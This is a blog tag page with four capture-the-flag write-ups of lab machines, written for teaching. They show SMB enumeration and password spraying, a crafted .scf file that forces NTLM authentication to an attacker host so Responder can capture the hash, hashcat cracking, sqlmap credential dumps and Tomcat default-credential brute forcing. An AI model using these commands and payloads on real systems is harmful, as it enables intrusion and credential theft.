<!doctype html>
<html lang="en" dir="ltr" class="blog-wrapper blog-tags-post-list-page plugin-blog plugin-id-default" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">4 posts tagged with &quot;windows&quot; | Penetration Testing Journal</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://danae-pan.github.io/Blog/blog/tags/windows"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" property="og:title" content="4 posts tagged with &quot;windows&quot; | Penetration Testing Journal"><meta data-rh="true" name="docusaurus_tag" content="blog_tags_posts"><meta data-rh="true" name="docsearch:docusaurus_tag" content="blog_tags_posts"><link data-rh="true" rel="canonical" href="https://danae-pan.github.io/Blog/blog/tags/windows"><link data-rh="true" rel="alternate" href="https://danae-pan.github.io/Blog/blog/tags/windows" hreflang="en"><link data-rh="true" rel="alternate" href="https://danae-pan.github.io/Blog/blog/tags/windows" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/Blog/blog/rss.xml" title="Penetration Testing Journal RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/Blog/blog/atom.xml" title="Penetration Testing Journal Atom Feed"><link rel="stylesheet" href="/Blog/assets/css/styles.e69e0e8b.css">
<script src="/Blog/assets/js/runtime~main.2caf8296.js" defer="defer"></script>
<script src="/Blog/assets/js/main.e129374b.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"dark")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/Blog/"><b class="navbar__title text--truncate">About Me</b></a><a class="navbar__item navbar__link" href="/Blog/docs/phases/Introduction">Guides</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/Blog/blog/">Write Ups</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/Blog/docs/stories/Brain: the first computer virus">Bedtime Stories</a><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_pO2u margin-bottom--md">Recent posts</div><div role="group"><h3 class="yearGroupHeading_rMGB">2025</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Cicada">Cicada</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/BoardLight">Board Light</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Driver">Driver</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Precious">Precious</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Writeup">Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Paper">Paper</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Devvortex">Devvortex</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/GoodGames">Good Games</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Sau">Sau</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Jerry">Jerry</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/Blog/blog/Cap">Cap</a></li></ul></div></nav></aside><main class="col col--7"><header class="margin-bottom--xl"><h1>4 posts tagged with &quot;windows&quot;</h1><a href="/Blog/blog/tags">View All Tags</a></header><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/Blog/blog/Cicada">Cicada</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2025-06-15T00:00:00.000Z">June 15, 2025</time> · <!-- -->4 min read</div></header><div class="markdown"><h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="#task-1" class="hash-link" aria-label="Direct link to Task 1" title="Direct link to Task 1">​</a></h3>
<p>What is the name of the non-default SMB share that is readable with guest access on Cicada?</p>
<p>Running <code>smbclient -N -L //&lt;target_ip&gt;</code> to connect to the share server without providing a password and list the shares we see two non-default shares named <code>DEV</code> and <code>HR</code>.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-ci-1-7a0f8837bba661162cef6b200f1e3154.png" width="1546" height="746" class="img_ev3q"></p>
<p>Next, to see which one is readable as a guest, we will try to connect to those specific shares. Running <code>smbclient -N //&lt;target_ip&gt;/&lt;share_name&gt;</code> we see the one we have access to read is the <code>HR</code> share.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-ci-2-eebd0b9bbbfa684c22e86f2ec6e3d7a3.png" width="1546" height="708" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
<p>What is the name of the file found in the HR share?</p>
<p>Seen in the previous task, from listing the contents of the HR share, the file name is &quot;Notice from HR.txt&quot;.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="#task-3" class="hash-link" aria-label="Direct link to Task 3" title="Direct link to Task 3">​</a></h3>
<p>Which user account is still using the company default password?</p>
<p>To see the contents of the file found, we can transfer it to the host by running ``get &quot;Notice from HR.txt&quot;. Opening it, we see a welcoming message to a new hire with the default password but it does not give a username</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-ci-3-d2178dfc2751758ad33ea1b8ab1c2ad0.png" width="1546" height="506" class="img_ev3q"></p>
<p>Then, we can try to enumerate domain users on the target IP and save them to a file by running <code>lookupsid.py anonymous@&lt;target_ip&gt; &gt; lookupsid_output.txt</code>. Then, we save the usernames cleanly we run <code>grep &#x27;(SidTypeUser)&#x27; lookupsid_output.txt | awk -F &#x27;\\&#x27; &#x27;{print $2}&#x27; | cut -d&#x27; &#x27; -f1 &gt; users.txt</code>.  Finally using the password found in the file, we can perform a password spray attack by running <code>netexec smb &lt;target_ip&gt; -u users.txt -p &#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27;</code> and find the username to be michael.wrightson.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-ci-5-c5ee995f367e271c4fee423af0310ef2.png" width="2286" height="812" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-4">Task 4<a href="#task-4" class="hash-link" aria-label="Direct link to Task 4" title="Direct link to Task 4">​</a></h3>
<p>Which user has left their password in Active Directory metadata?</p>
<p>We dump the AD metadata using <code>ldapdomaindump -u cicada.htb\\michael.wrightson -p &#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27; &lt;target_ip&gt;</code>. We then try the command <code>grep -iE &#x27;pass|key|desc|comment&#x27; domain_users.json</code> to look for password in the file matching any lines that contain the mentioned keywords.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-ci-6-3faaff942dfef3c5779551800503056d.png" width="1696" height="808" class="img_ev3q"></p>
<p>After finding the password we can try to connect with it using the users.txt file from the previous task as <code>netexec smb &lt;target_ip&gt; -u users.txt -p &#x27;aRt$Lp#7t*VQ!3&#x27;</code>.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-ci-7-c2c4836b59b20798e6ecf167ebf3d68c.png" width="1696" height="974" class="img_ev3q"></p>
<p>`</p></div><footer class="row docusaurus-mt-lg"><div class="col col--9"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/Blog/blog/tags/easy">easy</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/Blog/blog/tags/windows">windows</a></li></ul></div><div class="col text--right col--3"><a aria-label="Read more about Cicada" href="/Blog/blog/Cicada"><b>Read more</b></a></div></footer></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/Blog/blog/Driver">Driver</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2025-05-25T00:00:00.000Z">May 25, 2025</time> · <!-- -->6 min read</div></header><div class="markdown"><h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="#task-1" class="hash-link" aria-label="Direct link to Task 1" title="Direct link to Task 1"> ​</a></h3>
<p>We&#x27;re prompted for log on credentials when accessing the target over HTTP. What username is disclosed when looking at the HTTP response headers?</p>
<p>We use curl with the option for fetching headers only <code>curl -I &lt;target_ip&gt;</code> and see on the <code>WWW-Authenticate</code> the username admin.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-dr-1-967690d0655d5e8dadc181e773374317.png" width="1518" height="456" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
<p>Weak passwords are all too common and this target is no exception. What is the password for this target&#x27;s login?</p>
<p>Before using any automated tools, we try with the default, common password <code>admin</code> and it gets us in. On the main page we are presented with a MFP Firmware Update Center.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-dr-2-a8c26f7bc0f632abffe552a8eb9858d6.png" width="1768" height="1200" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="#task-3" class="hash-link" aria-label="Direct link to Task 3" title="Direct link to Task 3">​</a></h3>
<p>There are several kinds of files that are commonly dropped into a file share to target other users who may browse to the share. If the user browses to the share, their host will try to authenticate to the attacker. What is the file extension that can be uploaded here to trigger that connection?</p>
<p>The file that is asked here, has the extension <code>.scf</code> which stands for Shell Command File. This file can be placed on a writable SMB share or web-based file upload to force outbound authentication requests. For more detailed information visit <a href="https://attack.mitre.org/techniques/T1187/" target="_blank" rel="noopener noreferrer">MITRE ATT&amp;CK</a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-4">Task 4<a href="#task-4" class="hash-link" aria-label="Direct link to Task 4" title="Direct link to Task 4">​</a></h3>
<p>We&#x27;ve intercepted an Net-NTLMv2 hash with Responder. What is the mode in Hashcat required to crack this hash format?</p>
<p>When Responder intercepts a Net-NTLMv2 hash, the format looks like:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">USERNAME::DOMAIN:ServerChallenge:NTProofStr:Blob</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This structure corresponds exactly to the format supported by Hashcat mode 5600 which is backed up by the Hashcat official documentation <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener noreferrer">Hashcat Generic hash types</a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-5">Task 5<a href="#task-5" class="hash-link" aria-label="Direct link to Task 5" title="Direct link to Task 5">​</a></h3>
<p>What is the tony user&#x27;s password?</p>
<p>To solve this task, we will start responder <code>sudo responder -I tun0</code> and then upload a scf file to the file share via the printer upload form that would trigger an SMB authentication. We create a file as follows:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">[Shell]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Command=2</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">IconFile=\\&lt;host_ip&gt;\share\icon.ico</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">[Taskbar]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Command=ToggleDesktop</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This works, and the Net-NTLMv2 hash is captured by Responder because this upload is reviewed manually and thus opened as the web page explains.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-dr-3-553d51e293be0b7af82c86cf1ada2873.png" width="1516" height="734" class="img_ev3q"></p>
<p>As mentioned in the previous task, the full hash string can be cracked using Hashcat mode 5600. We create a file called tony_hash with this hash, we run <code>hashcat -m 5600 -a 0 tony_hash.txt /usr/share/wordlists/rockyou.txt</code> and the password is cracked.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-6">Task 6<a href="#task-6" class="hash-link" aria-label="Direct link to Task 6" title="Direct link to Task 6">​</a></h3>
<p>Submit the flag located on the tony user&#x27;s desktop.</p>
<p>We will first list the shared folders on the target Microsoft-DS by running <code>smbclient -L //&lt;target_ip&gt; -U &#x27;tony&#x27;</code> using the user tony&#x27;s password we found in the previous task.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-dr-4-6721f07e64b15fe7f34528be404b096d.png" width="1516" height="568" class="img_ev3q"></p>
<p>Then we can try connecting directly to the <code>C$</code> default share by running <code>smbclient //&lt;target_ip&gt;/C$ -U &#x27;tony&#x27;</code> which gave us access denied. We then try <code>crackmapexec smb &lt;target_ip&gt; -u tony -p &#x27;liltony&#x27; --shares</code></p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-dr-5-222eb28f5736b4759d4dc4b2a8e7e543.png" width="1674" height="764" class="img_ev3q"></p>
<p>This validates that the user does not have access but we see that Windows 10 Enterprise is used which by default has WinRM installed and often enabled.</p>
<p><code>crackmapexec winrm &lt;target_ip&gt; -u tony -p liltony</code></p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-dr-16-55ecfa90176cce9deb2e786c7f67fb39.png" width="1674" height="268" class="img_ev3q"></p>
<p>Since the service is enabled we can use <code>evil-winrm -i &lt;target_ip&gt; -u tony -p liltony</code>. We have access and navigating to tony&#x27;s Desktop we get the flag by <code>cat user.txt</code>.</p></div><footer class="row docusaurus-mt-lg"><div class="col col--9"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/Blog/blog/tags/easy">easy</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/Blog/blog/tags/windows">windows</a></li></ul></div><div class="col text--right col--3"><a aria-label="Read more about Driver" href="/Blog/blog/Driver"><b>Read more</b></a></div></footer></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/Blog/blog/GoodGames">Good Games</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2025-04-20T00:00:00.000Z">April 20, 2025</time> · <!-- -->5 min read</div></header><div class="markdown"><h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="#task-1" class="hash-link" aria-label="Direct link to Task 1" title="Direct link to Task 1">​</a></h3>
<p>Submit User Flag</p>
<p>We use nmap to find the services on the target machine and we see that an apache server runs on port 80.</p>
<p><code>nmap -sV target_ip</code></p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-g-619aec147bcca7992c4a856afd59376d.png" width="800" height="325" class="img_ev3q"></p>
<p>Navigating to the browser we see a login page where we will try bypassing the authentication using SQL injection.</p>
<p>Server-Side Template Injection (SSTI) vulnerability arises when an application incorporates user-supplied input directly into its server-side templates without proper sanitization or validation. Template engines, which combine templates with dynamic data to generate web pages, can be exploited through SSTI attacks.</p>
<p>To find forms that are candidates for sql injection run</p>
<p><code>sqlmap -u &quot;http://10.129.51.14/&quot; --forms --crawl=2 --dbms=mysql</code></p>
<p>--crawl=CRAWLDEPTH: crawls the website starting from the target url</p>
<p>We find a total of 8 targets. One of the identified forms is the login form and sqlmap auto-filled blank fields, tried multiple techniques and identified that the email field is vulnerable to time-based blind SQL injection.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-g-3-8ddec9f638f40155c2cfce60b335ca99.png" width="816" height="485" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-g-5-14f9524c6351ec8b2949c6aabdb1699a.png" width="816" height="264" class="img_ev3q"></p>
<p>After confirming the vulnerability we want to enumerate the database and find the table storing the usernames and passwords to get the user flag.</p>
<p>We can try running the following command to retrieve the databse names.</p>
<p><code>sqlmap -u &quot;http://10.129.51.14/login&quot; --data=&quot;email=*&amp;password=test123&quot; --dbs</code></p>
<p>We found 2 available databases named information_schema and main.</p>
<p>Next, we will list the tables from each.</p>
<p><code>sqlmap -u &quot;http://10.129.51.14/login&quot; --data=&quot;email=*&amp;password=test123/login&quot; -D &lt;database_name&gt; --tables</code></p>
<p>Starting with the database named main, we find 3 tables blog, blog_comments and user and which we can further investigate.
We start with the table user.</p>
<p><code>sqlmap -u &quot;http://10.129.51.14/login&quot; --data=&quot;email=*&amp;password=test123/login&quot; -D main -T user --columns</code></p>
<p>There, we find 4 columns in total with a column named email and a column name password that might get us the flags we need.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-g-9-708f4e42c7a8b057b1491a527b02dd4c.png" width="1228" height="536" class="img_ev3q"></p>
<p>We then run the following command to retreive that information.</p>
<p><code>sqlmap -u &quot;http://10.129.51.14/login&quot; --data=&quot;email=*&amp;password=test123/login&quot; -D main -T user -C email,password --dump</code></p>
<p>We find the email and the password and with those credentials we login after we use a hash cracker to find the plain texts password from the hashed one.</p>
<p>Now that we are logged in as admin, we can see a gear on the top right that redirects as to internal-administration.goodgames.htb. We need to edit the /etc/hosts file to point this domain to the target machine&#x27;s IP.
Note, editing the hosts file requires administrative privileges.</p></div><footer class="row docusaurus-mt-lg"><div class="col col--9"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/Blog/blog/tags/easy">easy</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/Blog/blog/tags/windows">windows</a></li></ul></div><div class="col text--right col--3"><a aria-label="Read more about Good Games" href="/Blog/blog/GoodGames"><b>Read more</b></a></div></footer></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/Blog/blog/Jerry">Jerry</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2025-04-06T00:00:00.000Z">April 6, 2025</time> · <!-- -->4 min read</div></header><div class="markdown"><h3 class="anchor anchorWithStickyNavbar_LWe7" id="task1">Task1<a href="#task1" class="hash-link" aria-label="Direct link to Task1" title="Direct link to Task1">​</a></h3>
<p>Which TCP port is open on the remote host?</p>
<p>Run nmap to scan for ports</p>
<p><code>nmap -sS -p- &lt;target_ip&gt;</code></p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-j-13e88223d5fcbe743d32858ceda2d22e.png" width="680" height="222" class="img_ev3q"></p>
<p>After scanning, the port 8080 is revelead to be open, where the http-proxy service is running.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
<p>Which web server is running on the remote host? Looking for two words.</p>
<p>To find the web server, we need to add the version field on the nmap scan.</p>
<p><code>nmap -sV -p 8080 &lt;target_ip&gt;</code></p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-j-1-9bc478d2c4c78cf3404b0c25a80bdfce.png" width="801" height="274" class="img_ev3q"></p>
<p>We see on the version that the web server is <strong>Apache Tomcat</strong>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="#task-3" class="hash-link" aria-label="Direct link to Task 3" title="Direct link to Task 3">​</a></h3>
<p>Which relative path on the webserver leads to the Web Application Manager?</p>
<p>Open a browser and navigate to the ip address of the target. Remember to specify the port to be 8080.</p>
<p>Take a look at the page, to see you can find anything useful. Under <strong>Managing Tomcat</strong> you see a URL to <strong>manager webapp</strong> which might be what is refered as Web Application Manager. It is stated that for security, access is restricted and users are defined in <strong>$CATALINA_HOME/conf/tomcat-users.xml</strong>. This seems like an interesting information, but let&#x27;s first see what the URL gets us. When clicking we get redirected to <strong>/manager/html</strong> where we are asked to input our credential. This is a point we should keep in mind, but for now we got the relative path the question is asking for.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-4">Task 4<a href="#task-4" class="hash-link" aria-label="Direct link to Task 4" title="Direct link to Task 4">​</a></h3>
<p>What is the valid username and password combination for authenticating into the Tomcat Web Application Manager? Give the answer in the format of username<!-- -->:password</p>
<p>On the previous step, we navigated to the <strong>/manager/html</strong> were we were asked for credentials. Since we were not able to authenticate, we show an example in the page of how to add a role to a user for accesssing the manager application. We can try to use those example credentials and see if they work on the login prompt, and they do!</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-j-6-b730756cc58d8a5efdd00ae6ffd2a0f1.png" width="993" height="395" class="img_ev3q"></p>
<p>Another approach to this, is using <strong>Metasploit Framework</strong>. First, run <code>msfconsole</code> and then <code>search tomcat</code>. There you will find the auxiliary <strong>auxiliary/scanner/http/tomcat_mgr_login</strong> which will attempt to login based on a list of username - password names. To use it, run <code>use &lt;number_of_option&gt;</code> and then to see what you it is required for you to set <code>show options</code>.</p>
<p>To select the target IP address and the port, run <code>set RHOSTS &lt;target_ip&gt;</code> and <code>set RPORT &lt;target_port&gt;</code>. Then type <code>run</code> and you will see that a login attempt was succesfull! As seen, those are the same credentials that were found before.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="/Blog/assets/images/image-j-7-bb38c07471055921e123bb8eb4812166.png" width="752" height="246" class="img_ev3q"></p></div><footer class="row docusaurus-mt-lg"><div class="col col--9"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/Blog/blog/tags/easy">easy</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/Blog/blog/tags/windows">windows</a></li></ul></div><div class="col text--right col--3"><a aria-label="Read more about Jerry" href="/Blog/blog/Jerry"><b>Read more</b></a></div></footer></article><nav class="pagination-nav" aria-label="Blog list page navigation"></nav></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Contact</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/danae-pan" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://linkedin.com/in/anastasia-danai-panagiotopoulou" target="_blank" rel="noopener noreferrer" class="footer__link-item">LinkedIn<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div></div></footer></div>
</body>
</html>